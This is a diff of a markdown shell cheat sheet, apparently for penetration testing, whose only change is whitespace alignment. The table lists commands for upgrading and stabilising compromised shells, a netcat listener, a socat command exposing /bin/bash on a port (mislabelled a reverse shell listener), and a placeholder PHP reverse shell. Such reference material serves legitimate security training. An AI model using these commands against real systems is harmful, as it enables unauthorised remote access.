@@ -20,10 +20,10 @@
 ## Common Shell Commands and Tips
 | **Command**                                | **Purpose**                                                                       |
 |--------------------------------------------|-----------------------------------------------------------------------------------|
-| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to a fully interactive shell.                                            |
+| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to a fully interactive shell.                                      |
 | `export TERM=xterm`                        | Fix terminal display issues in a simple shell.                                    |
 | `CTRL + Z`                                 | Background the current shell process.                                             |
 | `stty raw -echo` and `fg`                  | Fix line formatting issues when bringing a shell to the foreground.               |
 | `rlwrap nc -lvnp <PORT>`                   | Use `rlwrap` for history and arrow key navigation in Netcat shells.               |
-| `socat tcp-listen:<PORT>,reuseaddr,fork exec:/bin/bash` | Start an advanced reverse shell listener.                                         |
+| `socat tcp-listen:<PORT>,reuseaddr,fork exec:/bin/bash` | Start an advanced reverse shell listener.                            |
 | `php -r '...'`                             | Execute a PHP reverse shell payload.                                              |
